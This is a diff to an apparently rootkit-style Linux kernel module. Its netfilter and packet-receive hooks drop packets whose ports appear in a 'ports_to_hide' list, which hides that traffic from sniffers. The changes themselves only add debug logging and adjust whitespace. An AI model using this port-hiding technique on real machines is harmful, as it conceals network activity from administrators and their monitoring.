@@ -74,7 +74,7 @@ static int switch_net_hook(void){
 	/* Initialize netfilter hook */
 	nfho->hook = (nf_hookfn*)hack_packet;		/*hook function*/
 	nfho->hooknum = NF_INET_PRE_ROUTING;		/*received packets(before processing)*/
-	nfho->pf = PF_INET;						/*IPv4*/
+	nfho->pf = PF_INET;							/*IPv4*/
 	nfho->priority = NF_IP_PRI_FIRST;			/*max hook priority*/
 	
 	nf_register_net_hook(&init_net, nfho); /*register the hook*/
@@ -109,7 +109,9 @@ static int hack_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct p
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP;
 		}
 	}
@@ -117,7 +119,9 @@ static int hack_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct p
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP;
 		}
 	}
@@ -139,7 +143,9 @@ static int hack_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, str
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP; 
 		}
 	}
@@ -147,7 +153,9 @@ static int hack_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, str
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP;
 		}
 	}
@@ -168,7 +176,9 @@ static int hack_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct 
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP;
 		}
 	}
@@ -176,7 +186,9 @@ static int hack_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct 
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
+		pr_info("a %s\n", dest_port);
 		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			find_node(&ports_to_hide, source_port) == 0 ? pr_info("packet from %s was blocked\n", source_port) : pr_info("packet to %s was blocked\n", dest_port);
 			return NF_DROP;
 		}
 	}
